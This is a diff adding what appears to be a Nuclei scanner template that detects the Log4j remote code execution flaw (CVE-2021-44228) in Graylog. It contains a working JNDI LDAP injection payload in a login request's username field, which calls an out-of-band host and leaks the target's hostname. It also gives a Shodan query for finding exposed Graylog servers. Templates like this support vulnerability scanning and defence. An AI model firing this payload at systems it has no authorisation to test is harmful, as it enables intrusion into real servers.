@@ -1,0 +1,74 @@
+id: graylog-log4j
+
+info:
+  name: Graylog (Log4j) - Remote Code Execution
+  author: DhiyaneshDK
+  severity: critical
+  description: Graylog is susceptible to remote code execution via the Apache Log4j 2 library prior to 2.15.0 by recording its own log information, specifically with specially crafted values sent as user input. Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI-related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
+  reference:
+    - https://www.graylog.org/post/graylog-update-for-log4j
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"Graylog Web Interface"
+  tags: cve,cve2021,rce,jndi,log4j,graylog,kev,oast
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
+http:
+  - raw:
+      - |
+        POST /api/system/sessions HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        X-Requested-With: XMLHttpRequest
+        X-Requested-By: XMLHttpRequest
+        Content-Type: application/json
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}
+
+        {"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}","password":"admin","host":"{{Hostname}}"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - 'X-Graylog-Node-Id:'
+
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+# digest: 4a0a0047304502201473caf07463a006454c0b92a237e8d2f61ee543a2e07d96d7f052a3be9a8172022100cef3fe3ccff8492335fb35afdc56e2bf30dc54776d16291a4aeea7e232e6de92:922c64590222798bb761d5b6d8e72950
